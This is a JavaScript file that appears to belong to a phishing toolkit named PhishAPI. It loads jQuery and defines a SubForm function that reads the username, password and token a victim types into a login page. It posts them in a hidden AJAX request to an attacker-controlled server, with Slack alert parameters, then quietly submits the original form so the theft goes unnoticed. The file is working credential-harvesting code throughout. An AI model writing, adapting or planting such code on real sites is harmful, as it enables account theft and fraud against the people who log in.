// Anonymous "self-invoking" JQuery Function
(function() {
    var startingTime = new Date().getTime();
    // Load the script
    var script = document.createElement("SCRIPT");
    script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);

    // Poll for jQuery to come into existance
    var checkReady = function(callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function() { checkReady(callback); }, 20);
        }
    };

    // Start polling...
    checkReady(function($) {
        $(function() {
            var endingTime = new Date().getTime();
            var tookTime = endingTime - startingTime;
            //window.alert("jQuery is loaded, after " + tookTime + " milliseconds!");
        });
    });
})();

// Main PhishAPI Form Submission Function
function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,CSRFToken){
	
	// Phisher Controlled Variables
	var APIPortal = SubForm.arguments[0];
	var FormName = SubForm.arguments[1];
	var Project = SubForm.arguments[2];
	var SlackBotName = SubForm.arguments[3];
	var SlackEmoji = SubForm.arguments[4];
	var UsernameInputID = SubForm.arguments[5];
	var PasswordInputID = SubForm.arguments[6];
	var RedirURL = encodeURIComponent(SubForm.arguments[7]);
	var CSRFToken = SubForm.arguments[8];
	// Vistim Controlled Variables
	var Username = document.getElementById(UsernameInputID).value;
	var Password = document.getElementById(PasswordInputID).value;
	var Token = document.getElementById("token");
    if(Token){
        var Token = Token.value;
    } else {
		Token = '';
	}
	var Extra = document.getElementById("extra");
	    if(Extra){
        var Extra = Extra.value;
    } else {
		Extra = '';
	}
	
	var URL = 'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&extra='+Extra+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji+'&CSRFtoken='+CSRFToken+'&redirurl='+RedirURL;

    $.ajax({
        // Post Transparent AJAX Request to PhishAPI Server
		url:APIPortal,
        type:'post',
		data:URL,
        success:function (msg){		
		
				// Grab Remote CSRF Token if Provided and Update Input Field to Match
				if(CSRFToken){
				var CSRFvalue = msg;
				if(document.getElementsByName(CSRFToken)){document.getElementsByName(CSRFToken)[0].value = CSRFvalue;}
				if(document.getElementById(CSRFToken)){document.getElementById(CSRFToken).value = CSRFvalue;}
				}
				
				// Submit Original Form
				if(document.getElementsByName(FormName)){
				var x = document.getElementsByName(FormName);
				} else {
				if(document.getElementById(FormName)){	
				var x = document.getElementById(FormName);
				}
				}
				
				setTimeout(function SubmitFormDelay() {
				x[0].submit();	
				}, 2000);
		}
    });

}